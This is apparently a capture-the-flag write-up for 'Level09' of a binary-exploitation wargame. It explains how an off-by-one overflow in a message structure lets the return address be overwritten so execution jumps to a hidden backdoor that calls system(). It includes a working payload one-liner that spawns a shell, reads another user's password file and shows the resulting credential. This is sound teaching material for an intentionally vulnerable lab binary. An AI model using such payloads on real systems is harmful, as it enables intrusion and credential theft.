# Level09

> For introductory information on this operating system and binary securities, check [here](./analysis.md).

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)). After a closer look, we can see a function that acts as the backdoor to the program which is never called during execution at address `0x000055555555488c` but we find a way to trigger it exploiting a buffer overflow to overwrite EIP once again.

There are several step to this exploit but it is pretty simple in the end.

First the overflow is induced because of a bad check that copies data from one array to another up to **41** bytes while the destination buffer is only **40** bytes long.

Since this destination buffer is a property within a structure, it will overwrite the next byte that could belong to another property which is the case here and this variable controls how much characters in your message you can copy to the message buffer once asked (maximum **140** in a normal scenario).

As we found the whole structure has an offset of **200** bytes from the next instruction stored in EIP and using this extra last byte when we're asked for a username we can bump the limit from **140** to **255** characters allowing us to overwrite the next instruction...

Then, in this secret backdoor, we're once again asked to input something that will be fed to a `system()` call, so we simply type `/bin/sh` to spawn a shell!

```shell
  $> (python -c "print '\x90' * 40 + '\xff\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n/bin/sh'"; cat) | ./level09 
  --------------------------------------------
  |   ~Welcome to l33t-m$n ~    v1337        |
  --------------------------------------------
  >: Enter your username
  >>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
  >>: >: Msg sent!
  cat /home/users/end/.pass
  j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

So next user credentials pair is `end:j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`.

Check [here](../source.c) for reproduction source-code of this binary.